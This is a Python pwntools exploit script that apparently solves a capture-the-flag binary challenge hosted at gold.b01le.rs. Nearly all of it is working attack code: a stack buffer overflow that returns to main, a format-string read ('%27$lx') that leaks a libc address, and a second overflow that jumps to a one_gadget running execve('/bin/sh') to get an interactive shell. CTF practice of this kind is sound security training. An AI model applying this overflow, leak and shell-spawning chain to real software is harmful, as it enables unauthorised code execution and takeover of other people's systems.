# python exploit.py
# python exploit.py REMOTE gold.b01le.rs 4008
from pwn import *
# from Crypto.Util.number import long_to_bytes


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x4012f7
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './chal_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = ELF('libc.so.6')

one_gadget = 0xebc81
"""
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
"""

io = start()
#gdb.attach(io, gdbscript=gdbscript)

payload = flat(
    b'A' * 64,
    p64(0x404060),   # rbp, but seems meaningless
    p64(0x40131f),   # default return address of help_me function
    p64(0x404060),
    elf.functions.main,   # go back to main function again after main finishes
)

payload2 = '%27$lx'
io.sendlineafter(b' where it could be?! \n', payload)
io.sendafter(b'song? ', payload2)

io.recvuntil(b'Ooohh! ')
libc.address = int(io.recvuntil(b'Thats', drop=True).decode().strip(), 16) - libc.symbols['__libc_start_main'] - 128
print('libc base', hex(libc.address))

payload3 = flat(
    b'C' * 64,
    p64(0x4040a0+0x80+16),   # song is at 0x4040a0, writable, and with plenty of null bytes satisfying requirements
    libc.address + one_gadget,
)

io.sendlineafter(b' where it could be?! \n', payload3)

# Receive the flag
io.interactive()